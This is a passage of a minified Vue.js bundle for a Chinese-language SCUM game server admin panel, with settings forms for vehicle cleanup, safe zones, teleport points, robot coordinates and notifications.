120px)","margin-left":"10px"},attrs:{disabled:!e.edit,min:0},model:{value:e.settingsForm.GameServerRestartBeforeAfterProtectTime.before,callback:function(t){e.$set(e.settingsForm.GameServerRestartBeforeAfterProtectTime,"before",t)},expression:"settingsForm.GameServerRestartBeforeAfterProtectTime.before"}}),i("span",{staticStyle:{display:"inline-block",width:"50px","margin-left":"10px"}},[e._v("分钟")])],1),i("div",{staticStyle:{width:"100%"}},[i("span",{staticStyle:{display:"inline-block",width:"50px","text-align":"right"}},[e._v("重启后:")]),i("a-input-number",{staticStyle:{width:"calc(100% - 120px)","margin-left":"10px"},attrs:{disabled:!e.edit,min:0},model:{value:e.settingsForm.GameServerRestartBeforeAfterProtectTime.after,callback:function(t){e.$set(e.settingsForm.GameServerRestartBeforeAfterProtectTime,"after",t)},expression:"settingsForm.GameServerRestartBeforeAfterProtectTime.after"}}),i("span",{staticStyle:{display:"inline-block",width:"50px","margin-left":"10px"}},[e._v("分钟")])],1)]),i("a-form-model-item",{attrs:{prop:"RobotRPYConfig"}},[i("template",{slot:"label"},[i("span",[e._v("机器人RPY坐标系配置")]),i("a-popover",{attrs:{placement:"left"}},[i("div",{staticStyle:{width:"500px"},attrs:{slot:"content"},slot:"content"},[i("p",{staticStyle:{"font-weight":"bolder"}},[e._v("*其实我也不是很知道SCUM设计这种硬核参数有个锤子用")]),i("p",{staticStyle:{"font-weight":"bolder"}},[e._v("R参数: roll，翻滚角ϕ（视角旋转）。向右滚为正，反之为负")]),i("p",{staticStyle:{"font-weight":"bolder"}},[e._v("P参数: pitch，俯仰角θ（往上往下）。抬头为正，反之为负。")]),i("p",{staticStyle:{"font-weight":"bolder"}},[e._v("Y参数: yaw，侧航角ψ（往左往右）。右偏航为正，反之为负。")])]),i("a-icon",{staticStyle:{"margin-left":"5px",transform:"translateY(13px)",cursor:"pointer"},attrs:{type:"info-circle",theme:"filled"}})],1)],1),i("div",{staticStyle:{width:"100%"}},[i("span",{staticStyle:{display:"inline-block",width:"50px","text-align":"right"}},[e._v("R参数:")]),i("a-input-number",{staticStyle:{width:"calc(100% - 70px)","margin-left":"10px"},attrs:{disabled:!e.edit,min:0},model:{value:e.settingsForm.RobotRPYConfig.R,callback:function(t){e.$set(e.settingsForm.RobotRPYConfig,"R",t)},expression:"settingsForm.RobotRPYConfig.R"}})],1),i("div",{staticStyle:{width:"100%"}},[i("span",{staticStyle:{display:"inline-block",width:"50px","text-align":"right"}},[e._v("P参数:")]),i("a-input-number",{staticStyle:{width:"calc(100% - 70px)","margin-left":"10px"},attrs:{disabled:!e.edit,min:0},model:{value:e.settingsForm.RobotRPYConfig.P,callback:function(t){e.$set(e.settingsForm.RobotRPYConfig,"P",t)},expression:"settingsForm.RobotRPYConfig.P"}})],1),i("div",{staticStyle:{width:"100%"}},[i("span",{staticStyle:{display:"inline-block",width:"50px","text-align":"right"}},[e._v("Y参数:")]),i("a-input-number",{staticStyle:{width:"calc(100% - 70px)","margin-left":"10px"},attrs:{disabled:!e.edit,min:0},model:{value:e.settingsForm.RobotRPYConfig.Y,callback:function(t){e.$set(e.settingsForm.RobotRPYConfig,"Y",t)},expression:"settingsForm.RobotRPYConfig.Y"}})],1)],2)],1)],1),i("Loading",{attrs:{tip:"正在加载",show:e.loading}})],1)])],1)}),[],!1,null,"4ac00262",null).exports),Aa=(i("fb6a"),["VehicleIdList"]),Da={name:"VehiclesSettings",components:{Loading:w},computed:Object(s.a)({},Object(v.mapState)(["userInfo"])),data:function(){return{isProduction:!0,backendHost:window.BACKEND_HOST,vueAppBackendHost:Object({NODE_ENV:"production",BASE_URL:"/admin/"}).VUE_APP_BACKEND_HOST,window:window,show:!1,loading:!1,edit:!1,saveLoading:!1,vehicleIdList:{},settingsForm:{DiDiVehicleType:null,RecentVehiclesId:null},settingsFormRules:{DiDiVehicleType:[{required:!0,trigger:"change",message:"请输入滴滴车型号",validator:function(e,t,i){t&&t.length?i():i(new Error("请输入滴滴车型号"))}}],RecentVehiclesId:[{required:!0,trigger:"change",message:"请输入最近刷新的载具ID",validator:function(e,t,i){"number"==typeof t&&t>=0&&t===parseInt(t)?i():i(new Error("请输入最近刷新的载具ID"))}}]},cleanVehiclesIds:"",cleanVehiclesIdsLoading:!1,cleanDidiVehiclesLoading:!1,moment:R.a}},mounted:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.next=2,e.getData();case 2:case"end":return t.stop()}}),t)})))()},methods:{getData:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i,a,n,o;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return e.loading=!0,t.prev=1,t.next=4,f({method:"GET",url:"/serverConfigAdminSys/vehiclesSettings"});case 4:i=t.sent,e.loading=!1,200===i.status&&(a=i.data,n=a.VehicleIdList,o=Object(r.a)(a,Aa),e.$set(e,"settingsForm",o),e.$set(e,"vehicleIdList",n)),t.next=13;break;case 9:t.prev=9,t.t0=t.catch(1),console.error(t.t0),e.loading=!1;case 13:case"end":return t.stop()}}),t,null,[[1,9]])})))()},onClickEdit:function(){this.show=!0,this.edit=!0},onClickCancelEdit:function(){this.edit=!1,this.getData()},onClickSave:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:e.$refs.settingsForm.validate(function(){var t=Object(o.a)(regeneratorRuntime.mark((function t(i){var a,n;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:if(!i){t.next=20;break}return a=Object(A.cloneDeep)(e.settingsForm),console.log(a),e.saveLoading=!0,t.prev=4,t.next=7,f({method:"PUT",url:"/serverConfigAdminSys/updateVehiclesSettings",data:a});case 7:if(n=t.sent,e.saveLoading=!1,200!==n.status){t.next=14;break}return e.$message.success("修改成功"),e.edit=!1,t.next=14,e.getData();case 14:t.next=20;break;case 16:t.prev=16,t.t0=t.catch(4),console.error(t.t0),e.saveLoading=!1;case 20:case"end":return t.stop()}}),t,null,[[4,16]])})));return function(e){return t.apply(this,arguments)}}());case 1:case"end":return t.stop()}}),t)})))()},onClickCleanVehiclesIds:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i,a,n,r,o,s,l;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:if(t.prev=0,e.cleanVehiclesIds&&e.cleanVehiclesIds.length){t.next=5;break}return console.log(null),e.$message.warning("请确保按照格式填写待清空载具ID"),t.abrupt("return");case 5:if(i=e.cleanVehiclesIds.split("\n").map((function(e){return e.split(" ").filter((function(e){return e.length>0})).slice(0,6)})),void 0===(a=i.find((function(e){return!e||6!==e.length||/#[0-9]{1,}$/.test(e[0])||!(e[3]&&e[3].startsWith("X="))||!(e[4]&&e[4].startsWith("Y="))||!(e[5]&&e[5].startsWith("Z="))})))){t.next=11;break}return console.log("illegal:",i,a),e.$message.warning("请确保按照格式填写待清空载具ID"),t.abrupt("return");case 11:return t.next=13,f({method:"GET",url:"/serverConfigAdminSys/vehiclesSettings"});case 13:return 200===(r=t.sent).status&&(n=r.data.DiDiVehicleType),o=i.filter((function(e){return e[1].toLowerCase()===n.toLowerCase()})).map((function(e){return parseInt(e[0].substring(1,e[0].length))})),console.log(i,o),s={vehicleIds:o},e.cleanVehiclesIdsLoading=!0,t.prev=19,t.next=22,f({method:"DELETE",url:"/buyAdminSys/cleanVehicles",data:s});case 22:l=t.sent,e.cleanVehiclesIdsLoading=!1,200===l.status&&(e.$message.success("已提交"),e.cleanVehiclesIds=""),t.next=31;break;case 27:t.prev=27,t.t0=t.catch(19),console.error(t.t0),e.cleanVehiclesIdsLoading=!1;case 31:t.next=37;break;case 33:t.prev=33,t.t1=t.catch(0),console.log(t.t1),e.$message.warning("请确保按照格式填写待清空载具ID");case 37:case"end":return t.stop()}}),t,null,[[0,33],[19,27]])})))()},onClickCleanDidiVehicles:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return e.cleanDidiVehiclesLoading=!0,t.prev=1,t.next=4,f({method:"DELETE",url:"/buyAdminSys/cleanDidiVehicles"});case 4:i=t.sent,e.cleanDidiVehiclesLoading=!1,200===i.status&&e.$message.success("已提交"),t.next=13;break;case 9:t.prev=9,t.t0=t.catch(1),console.error(t.t0),e.cleanDidiVehiclesLoading=!1;case 13:case"end":return t.stop()}}),t,null,[[1,9]])})))()}}},$a=(i("2bdb"),Object(S.a)(Da,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("div",{staticStyle:{width:"100%",height:"auto",position:"relative",background:"white"}},[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"calc(100% - 80px)",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top","overflow-x":"auto","white-space":"nowrap"}},[i("span",[e._v("载具设置")]),e.edit?e._e():i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:"sync"},on:{click:e.getData}},[e._v("刷新")]),e.loading?e._e():[e.edit||!e.userInfo||"sysAdmin"!==e.userInfo.role&&"admin"!==e.userInfo.role?e._e():i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:"edit"},on:{click:e.onClickEdit}},[e._v("编辑")]),e.edit?i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{type:"primary",size:"small",icon:"edit",loading:e.saveLoading},on:{click:e.onClickSave}},[e._v("保存")]):e._e(),e.edit?i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:"close",disabled:e.saveLoading},on:{click:e.onClickCancelEdit}},[e._v("取消")]):e._e()]],2),i("a-button",{staticStyle:{float:"right",width:"70px"},attrs:{icon:e.show?"minus":"plus",size:"small",type:"primary"},on:{click:function(t){e.show=!e.show}}},[e._v(e._s(e.show?"收起":"展开"))])],1),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("transition",{attrs:{name:"fade"}},[i("div",{directives:[{name:"show",rawName:"v-show",value:e.show,expression:"show"}],staticStyle:{width:"100%","min-height":"350px",position:"relative",background:"white","overflow-y":"auto"}},[i("div",{staticStyle:{width:"100%",height:"100%",position:"absolute"}},[e.loading?e._e():i("a-form-model",{ref:"settingsForm",staticStyle:{"max-width":"750px"},attrs:{model:e.settingsForm,rules:e.settingsFormRules,"label-col":{span:7},"wrapper-col":{span:17}}},[i("a-form-model-item",{attrs:{label:"滴滴车型号",prop:"DiDiVehicleType"}},[i("a-input",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.DiDiVehicleType,callback:function(t){e.$set(e.settingsForm,"DiDiVehicleType",t)},expression:"settingsForm.DiDiVehicleType"}})],1),i("a-form-model-item",{attrs:{label:"最近刷新的载具ID(选项已失效)",prop:"RecentVehiclesId",extra:"大于等于零的整数，如果没有刷新/购买过载具则为0"}},[i("a-input-number",{attrs:{disabled:"",min:0},model:{value:e.settingsForm.RecentVehiclesId,callback:function(t){e.$set(e.settingsForm,"RecentVehiclesId",t)},expression:"settingsForm.RecentVehiclesId"}})],1),!e.userInfo||"sysAdmin"!==e.userInfo.role&&"admin"!==e.userInfo.role?e._e():i("a-divider"),!e.userInfo||"sysAdmin"!==e.userInfo.role&&"admin"!==e.userInfo.role?e._e():i("a-form-model-item",[i("template",{slot:"label"},[i("span",[e._v("清空载具")]),i("a-popover",{attrs:{placement:"left"}},[i("div",{staticStyle:{width:"500px"},attrs:{slot:"content"},slot:"content"},[i("p",{staticStyle:{"font-weight":"bolder"}},[e._v('前往游戏中使用管理员指令"#ListSpawnedVehicles true"获得')]),i("p",[i("strong",[e._v("【步骤一】：")]),e._v('使用管理员账号登录服务器输入"#ListSpawnedVehicles true"')]),i("p",[i("img",{staticStyle:{width:"500px"},attrs:{src:(e.isProduction?e.backendHost:e.vueAppBackendHost)+"/image/getOldImg?originalPath=https://i1.fuimg.com/734277/d56a6a2818ff9892.png"}})]),i("p",[i("strong",[e._v("【步骤二】：")]),e._v("粘贴到这里的输入框")])]),i("a-icon",{staticStyle:{"margin-left":"5px",transform:"translateY(13px)",cursor:"pointer"},attrs:{type:"info-circle",theme:"filled"}})],1)],1),i("a-input",{attrs:{type:"textarea","auto-size":{minRows:6,maxRows:6},placeholder:"输入'#ListSpawnedVehicles true'获得的结果"},model:{value:e.cleanVehiclesIds,callback:function(t){e.cleanVehiclesIds=t},expression:"cleanVehiclesIds"}}),i("a-popconfirm",{attrs:{placement:"right",title:"确定要清空以上载具吗"},on:{confirm:e.onClickCleanVehiclesIds}},[i("a-button",{attrs:{type:"danger",size:"small",icon:"delete",loading:e.cleanVehiclesIdsLoading}},[e._v("清空载具")])],1)],2),!e.userInfo||"sysAdmin"!==e.userInfo.role&&"admin"!==e.userInfo.role?e._e():i("a-form-model-item",[i("template",{slot:"label"},[i("span",[e._v("精准清理滴滴车")]),i("a-tooltip",{attrs:{placement:"left",title:"要使用该功能，需要先启用【可选功能】-【每5分钟获取服务器载具列表】并配合新版机器人使用"}},[i("a-icon",{staticStyle:{"margin-left":"5px",transform:"translateY(13px)",cursor:"pointer"},attrs:{type:"info-circle",theme:"filled"}})],1)],1),i("a-popconfirm",{attrs:{placement:"right",title:"确定要精准清空载具吗"},on:{confirm:e.onClickCleanDidiVehicles}},[i("a-button",{attrs:{type:"danger",size:"small",icon:"delete",loading:e.cleanDidiVehiclesLoading}},[e._v("清空滴滴车")])],1)],2),i("a-form-model-item",{attrs:{label:"服务器载具列表",prop:"vehicleIdList"}},[i("div",[e._v("最近更新时间: "+e._s(e.vehicleIdList.updateTimeStamp?e.moment(Number(e.vehicleIdList.updateTimeStamp)).format("YYYY-MM-DD HH:mm:ss"):"-"))]),i("a-select",{attrs:{value:e.vehicleIdList.list||[],mode:"tags",disabled:!0}})],1)],1)],1),i("Loading",{attrs:{tip:"正在加载",show:e.loading}})],1)])],1)}),[],!1,null,"089a2202",null).exports),Ua={name:"SafezoneSettings",components:{Loading:w},computed:Object(s.a)({},Object(v.mapState)(["userInfo"])),data:function(){var e=this;return{show:!1,loading:!1,edit:!1,saveLoading:!1,settingsForm:{SafeZone:[],SafeZoneTeleportPoint:{}},settingsFormRules:{SafeZone:[{trigger:"change",message:"请输入安全区",validator:function(t,i,a){i&&void 0!==i.find((function(t){return void 0===Object.keys(e.gameAreaData).find((function(e){return e===t}))}))?a(new Error("请输入安全区")):a()}}],SafeZoneTeleportPoint:[{trigger:"change",validator:function(t,i,a){console.log(i);var n,r,o=0;for(var s in i){var l,c=Object(we.a)(i[s]);try{for(c.s();!(l=c.n()).done;){var d=l.value,u=d.split(" "),p=u.find((function(e){return!D(e)}));if(3!==u.length||void 0!==p||!(parseFloat(u[0])>=e.gameAreaData[s].xMin&&parseFloat(u[0])<e.gameAreaData[s].xMax&&parseFloat(u[1])>=e.gameAreaData[s].yMin&&parseFloat(u[1])<e.gameAreaData[s].yMax)){o=3!==u.length||void 0!==p?1:2,n=s,r=d;break}}}catch(e){c.e(e)}finally{c.f()}if(0!==o)break}0===o?a():(e.$message.error(1===o?"".concat(n,'的"').concat(r,'"不是正确的传送点坐标'):"".concat(r,"不在").concat(n,"范围内")),a(new Error(1===o?"".concat(n,'的"').concat(r,'"不是正确的传送点坐标'):"".concat(r,"不在").concat(n,"范围内"))))}}]},gameAreaData:[],showAddSafeZoneTeleportZone:!1,addSafeZoneTeleportZoneSelect:"",SafeZoneTeleportPointInputInfo:{},expander:{SafeZoneTeleportPoint:!0}}},mounted:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.next=2,e.getGameAreaData();case 2:return t.next=4,e.getData();case 4:case"end":return t.stop()}}),t)})))()},methods:{getGameAreaData:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.prev=0,t.next=3,f({method:"GET",url:"/serverConfigAdminSys/gameAreaData"});case 3:200===(i=t.sent).status&&(e.gameAreaData=i.data),t.next=10;break;case 7:t.prev=7,t.t0=t.catch(0),console.error(t.t0);case 10:case"end":return t.stop()}}),t,null,[[0,7]])})))()},getData:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i,a,n;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return e.loading=!0,t.prev=1,t.next=4,f({method:"GET",url:"/serverConfigAdminSys/safeZoneSettings"});case 4:if(i=t.sent,e.loading=!1,200===i.status){for(n in e.$set(e,"settingsForm",i.data),a={},i.data.SafeZoneTeleportPoint)a[n]={inputVisible:!1,inputValue:""};e.$set(e,"SafeZoneTeleportPointInputInfo",a)}t.next=13;break;case 9:t.prev=9,t.t0=t.catch(1),console.error(t.t0),e.loading=!1;case 13:case"end":return t.stop()}}),t,null,[[1,9]])})))()},onClickEdit:function(){this.show=!0,this.edit=!0},onClickCancelEdit:function(){this.edit=!1,this.getData()},onClickSave:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:e.$refs.settingsForm.validate(function(){var t=Object(o.a)(regeneratorRuntime.mark((function t(i){var a,n;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:if(!i){t.next=20;break}return a=Object(A.cloneDeep)(e.settingsForm),console.log(a),e.saveLoading=!0,t.prev=4,t.next=7,f({method:"PUT",url:"/serverConfigAdminSys/updateSafeZoneSettings",data:a});case 7:if(n=t.sent,e.saveLoading=!1,200!==n.status){t.next=14;break}return e.$message.success("修改成功"),e.edit=!1,t.next=14,e.getData();case 14:t.next=20;break;case 16:t.prev=16,t.t0=t.catch(4),console.error(t.t0),e.saveLoading=!1;case 20:case"end":return t.stop()}}),t,null,[[4,16]])})));return function(e){return t.apply(this,arguments)}}());case 1:case"end":return t.stop()}}),t)})))()},onAddSafeZoneTeleportZone:function(){this.$set(this.settingsForm.SafeZoneTeleportPoint,this.addSafeZoneTeleportZoneSelect,[]),this.$set(this.SafeZoneTeleportPointInputInfo,this.addSafeZoneTeleportZoneSelect,{inputVisible:!1,inputValue:""}),this.showAddSafeZoneTeleportZone=!1,this.addSafeZoneTeleportZoneSelect=""},removeSafeZoneConfig:function(e){var t={};for(var i in this.settingsForm.SafeZoneTeleportPoint)i!==e&&(t[i]=this.settingsForm.SafeZoneTeleportPoint[i]);var a={};for(var n in this.SafeZoneTeleportPointInputInfo)n!==e&&(a[n]=this.SafeZoneTeleportPointInputInfo[n]);this.$set(this.settingsForm,"SafeZoneTeleportPoint",t),this.$set(this,"SafeZoneTeleportPointInputInfo",a)},handleClose:function(e,t){console.log(e,this.settingsForm.SafeZoneTeleportPoint);var i=this.settingsForm.SafeZoneTeleportPoint[e].filter((function(e){return e!==t}));this.$set(this.settingsForm.SafeZoneTeleportPoint,e,i)},showInput:function(e){this.$set(this.SafeZoneTeleportPointInputInfo[e],"inputVisible",!0),this.$nextTick((function(){document.getElementById("inputTag".concat(e)).focus()}))},handleInputChange:function(e,t){this.SafeZoneTeleportPointInputInfo[t].inputValue=e.target.value},handleInputConfirm:function(e){var t=this.SafeZoneTeleportPointInputInfo[e].inputValue,i=this.settingsForm.SafeZoneTeleportPoint[e];t&&-1===i.indexOf(t)&&(i=[].concat(Object(C.a)(i),[t])),this.SafeZoneTeleportPointInputInfo[e].inputVisible=!1,this.SafeZoneTeleportPointInputInfo[e].inputValue="",this.$set(this.settingsForm.SafeZoneTeleportPoint,e,i)}}},Na=(i("a3d1"),Object(S.a)(Ua,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("div",{staticStyle:{width:"100%",height:"auto",position:"relative",background:"white"}},[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"calc(100% - 80px)",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top","overflow-x":"auto","white-space":"nowrap"}},[i("span",[e._v("安全区和区域传送设置")]),e.edit?e._e():i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:"sync"},on:{click:e.getData}},[e._v("刷新")]),e.loading?e._e():[e.edit||!e.userInfo||"sysAdmin"!==e.userInfo.role&&"admin"!==e.userInfo.role?e._e():i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:"edit"},on:{click:e.onClickEdit}},[e._v("编辑")]),e.edit?i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{type:"primary",size:"small",icon:"edit",loading:e.saveLoading},on:{click:e.onClickSave}},[e._v("保存")]):e._e(),e.edit?i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:"close",disabled:e.saveLoading},on:{click:e.onClickCancelEdit}},[e._v("取消")]):e._e()]],2),i("a-button",{staticStyle:{float:"right",width:"70px"},attrs:{icon:e.show?"minus":"plus",size:"small",type:"primary"},on:{click:function(t){e.show=!e.show}}},[e._v(e._s(e.show?"收起":"展开"))])],1),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("transition",{attrs:{name:"fade"}},[i("div",{directives:[{name:"show",rawName:"v-show",value:e.show,expression:"show"}],staticStyle:{width:"100%",position:"relative",background:"white","overflow-y":"auto"},style:{minHeight:110+40*Object.keys(e.settingsForm.SafeZoneTeleportPoint).length+"px"}},[i("div",{staticStyle:{width:"100%",height:"100%",position:"absolute"}},[e.loading?e._e():i("a-form-model",{ref:"settingsForm",staticStyle:{"max-width":"900px"},attrs:{model:e.settingsForm,rules:e.settingsFormRules,"label-col":{span:7},"wrapper-col":{span:17}}},[i("a-form-model-item",{attrs:{label:"安全区",prop:"SafeZone"}},[i("a-select",{attrs:{mode:"multiple",disabled:!e.edit},model:{value:e.settingsForm.SafeZone,callback:function(t){e.$set(e.settingsForm,"SafeZone",t)},expression:"settingsForm.SafeZone"}},e._l(Object.keys(e.gameAreaData),(function(t){return i("a-select-option",{key:t,attrs:{label:t}},[e._v(e._s(t))])})),1)],1),i("a-form-model-item",{attrs:{prop:"SafeZoneTeleportPoint"}},[i("template",{slot:"label"},[i("span",[e._v("区域传送点")]),i("a-tooltip",{attrs:{placement:"top",title:"坐标为三个数字，以空格隔开"}},[i("a-icon",{staticStyle:{"margin-left":"5px",transform:"translateY(13px)",cursor:"pointer"},attrs:{type:"info-circle",theme:"filled"}})],1)],1),i("a-row",[i("a-popover",{attrs:{placement:"right",visible:e.showAddSafeZoneTeleportZone,trigger:"click"}},[i("div",{staticStyle:{width:"320px"},attrs:{slot:"title"},slot:"title"},[i("span",{staticStyle:{"font-weight":"bolder"}},[e._v("新增区域")]),i("span",{staticStyle:{cursor:"pointer"},on:{click:function(){e.showAddSafeZoneTeleportZone=!1,e.addSafeZoneTeleportZoneInput=""}}},[i("a-icon",{staticStyle:{color:"#ff4d4f",float:"right",display:"inline-block",transform:"translateY(4px)"},attrs:{type:"close-circle",theme:"filled"}})],1)]),i("div",{staticStyle:{width:"320px"},attrs:{slot:"content"},slot:"content"},[i("div",{staticStyle:{width:"100%",height:"40px"}},[i("div",{staticStyle:{width:"60px","text-align":"right",display:"inline-block"}},[e._v("区域:")]),i("a-select",{staticStyle:{width:"250px",display:"inline-block","margin-left":"10px"},attrs:{disabled:!e.edit},model:{value:e.addSafeZoneTeleportZoneSelect,callback:function(t){e.addSafeZoneTeleportZoneSelect=t},expression:"addSafeZoneTeleportZoneSelect"}},e._l(Object.keys(e.gameAreaData),(function(t){return i("a-select-option",{key:t,attrs:{label:t,disabled:!e.settingsForm.SafeZoneTeleportPoint||void 0!==Object.keys(e.settingsForm.SafeZoneTeleportPoint).find((function(e){return e===t}))}},[e._v(e._s(t))])})),1)],1),i("div",{staticStyle:{width:"100%",height:"40px","margin-top":"10px","text-align":"center"}},[i("a-button",{attrs:{type:"primary"},on:{click:e.onAddSafeZoneTeleportZone}},[e._v("提交")])],1)]),i("a-button",{attrs:{size:"small",disabled:!e.edit||e.showAddSafeZoneTeleportZone,icon:"plus"},on:{click:function(t){e.showAddSafeZoneTeleportZone=!0}}},[e._v("添加")])],1),i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:e.expander.SafeZoneTeleportPoint?"up":"down"},on:{click:function(){e.$set(e.expander,"SafeZoneTeleportPoint",!e.expander.SafeZoneTeleportPoint)}}},[e._v(e._s(e.expander.SafeZoneTeleportPoint?"隐藏":"显示"))])],1),e.expander.SafeZoneTeleportPoint?e._l(e.settingsForm.SafeZoneTeleportPoint,(function(t,a){return i("div",{key:a},[i("span",{staticStyle:{"margin-right":"10px"}},[e._v(e._s(a)+": ")]),e._l(t,(function(t){return[i("a-tag",{key:t,attrs:{closable:e.edit,disabled:!e.edit},on:{close:function(){return e.edit&&e.handleClose(a,t)}}},[e._v(e._s(t))])]})),e.SafeZoneTeleportPointInputInfo[a].inputVisible?i("a-input",{style:{width:"78px"},attrs:{disbaled:!e.edit,id:"inputTag"+a,type:"text",size:"small",value:e.SafeZoneTeleportPointInputInfo[a].inputValue},on:{change:function(t){return e.handleInputChange(t,a)},blur:function(){return e.handleInputConfirm(a)},keyup:function(t){return!t.type.indexOf("key")&&e._k(t.keyCode,"enter",13,t.key,"Enter")?null:function(){return e.handleInputConfirm(a)}.apply(null,arguments)}}}):i("a-tag",{staticStyle:{background:"#fff",borderStyle:"dashed"},attrs:{disabled:!e.edit},on:{click:function(){return e.edit&&e.showInput(a)}}},[i("a-icon",{attrs:{type:"plus"}}),e._v(" 添加坐标 ")],1),i("a-button",{attrs:{disabled:!e.edit,size:"small",type:"danger",icon:"delete"},on:{click:function(){e.removeSafeZoneConfig(a)}}},[e._v("移除")])],2)})):e._e()],2)],1)],1),i("Loading",{attrs:{tip:"正在加载",show:e.loading}})],1)])],1)}),[],!1,null,"4a7dba4b",null).exports),Ma={name:"NotificationSettings",components:{Loading:w,Editor:j},computed:Object(s.a)({},Object(v.mapState)(["userInfo"])),data:function(){var e=this;return{Error:Error,show:!1,loading:!1,edit:!1,saveLoading:!1,settingsForm:{StoreNotification:"",TopAnnouncement:"",FirstVisitAnnouncement:"",EnableEventKillLogBoardcast:!0,EnableKillQueue:!0,EnableLoginLogoutQueue:!0,EnableEnglishQueue:!0,EnableHomeAttackedNotification:!1,HomeAttackedNotificationConfigs:{type:"email",emailConfigs:{host:"",port:"",secure:!0,user:"",pass:""},smsConfigs:{accessKeyId:"",accessKeySecret:"",signNameJson:"",templateCode:""}},HomeAttackedPolicyConfigs:{trap:15,baseBuildingTake:15,lockPick:15},HomeAttackedSquadConfigs:[],EnableGameRoutineNotification:!1,GameRoutineNotification:[],GameRoutineNotificationInterval:null,RandomEventList:[],StoreCronSchedules:[]},existRandomEventList:[],settingsFormRules:{EnableStoreItemOpacity:[{required:!0,trigger:"change",message:"请选择",validator:function(e,t,i){"boolean"==typeof t?i():i(new Error("请选择"))}}],EnableEventKillLogBoardcast:[{required:!0,trigger:"change",message:"请选择",validator:function(e,t,i){"boolean"==typeof t?i():i(new Error("请选择"))}}],EnableKillQueue:[{required:!0,trigger:"change",message:"请选择",validator:function(e,t,i){"boolean"==typeof t?i():i(new Error("请选择"))}}],EnableLoginLogoutQueue:[{required:!0,trigger:"change",message:"请选择",validator:function(e,t,i){"boolean"==typeof t?i():i(new Error("请选择"))}}],EnableEnglishQueue:[{required:!0,trigger:"change",message:"请选择",validator:function(e,t,i){"boolean"==typeof t?i():i(new Error("请选择"))}}],EnableHomeAttackedNotification:[{trigger:"change",message:"请选择",validator:function(e,t,i){"boolean"==typeof t?i():i(new Error("请选择"))}}],HomeAttackedNotificationConfigs:[{trigger:"change",message:"请正确输入抄家提醒公共通知设置",validator:function(e,t,i){var a,n,r,o,s,l,c,d,u,p,m,g,h,f,y,v,x;"email"===(null==t?void 0:t.type)?null!=t&&null!==(a=t.emailConfigs)&&void 0!==a&&null!==(n=a.host)&&void 0!==n&&n.length&&null!=t&&null!==(r=t.emailConfigs)&&void 0!==r&&null!==(o=r.port)&&void 0!==o&&o.length&&/^([1-9][0-9]*)$/.test(null==t||null===(s=t.emailConfigs)||void 0===s?void 0:s.port)&&null!=t&&null!==(l=t.emailConfigs)&&void 0!==l&&null!==(c=l.user)&&void 0!==c&&c.length&&null!=t&&null!==(d=t.emailConfigs)&&void 0!==d&&null!==(u=d.pass)&&void 0!==u&&u.length?i():i(new Error("请正确输入抄家提醒公共通知设置")):null!=t&&null!==(p=t.smsConfigs)&&void 0!==p&&null!==(m=p.accessKeyId)&&void 0!==m&&m.length&&null!=t&&null!==(g=t.smsConfigs)&&void 0!==g&&null!==(h=g.accessKeySecret)&&void 0!==h&&h.length&&null!=t&&null!==(f=t.smsConfigs)&&void 0!==f&&null!==(y=f.signNameJson)&&void 0!==y&&y.length&&null!=t&&null!==(v=t.smsConfigs)&&void 0!==v&&null!==(x=v.templateCode)&&void 0!==x&&x.length?i():i(new Error("请正确输入抄家提醒公共通知设置"))}}],HomeAttackedPolicyConfigs:[{trigger:"change",message:"请正确输入抄家提醒公共策略设置",validator:function(e,t,i){"number"==typeof(null==t?void 0:t.trap)&&(null==t?void 0:t.trap)>0&&"number"==typeof(null==t?void 0:t.baseBuildingTake)&&(null==t?void 0:t.baseBuildingTake)>0&&"number"==typeof(null==t?void 0:t.lockPick)&&(null==t?void 0:t.lockPick)>0?i():i(new 